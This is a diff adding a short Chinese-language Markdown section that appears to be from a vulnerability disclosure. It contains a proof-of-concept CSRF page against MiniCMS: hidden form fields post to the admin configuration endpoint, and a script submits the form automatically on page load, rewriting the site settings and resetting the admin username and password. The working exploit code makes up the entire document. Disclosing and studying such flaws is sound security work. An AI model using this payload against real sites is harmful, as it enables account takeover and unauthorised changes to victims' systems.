@@ -1,0 +1,25 @@
+### POC实现代码如下：  
+
+> CSRF测试页面代码如下：
+``` html
+<html>
+ <head><meta http-equiv="Content-Type" content="text/html; charset=GB2312">
+ <title>test</title>
+ <body>
+ <form action="http://127.0.0.1/minicms/mc-admin/conf.php" method="post">
+ <input type="hidden" name="site_name" value="hack123" />  
+ <input type="hidden" name="site_desc" value="hacktest" />  
+ <input type="hidden" name="site_link" value="http://127.0.0.1/minicms" />  
+ <input type="hidden" name="user_nick" value="hack" />  
+ <input type="hidden" name="user_name" value="admin" />  
+ <input type="hidden" name="user_pass" value="hackpass" />  
+ <input type="hidden" name="comment_code" value="" />  
+ <input type="hidden" name="save" value=" " /> 
+ </form>
+ <script>
+  document.forms[0].submit();
+ </script>
+ </body>
+ </head>
+ </html>
+ ```
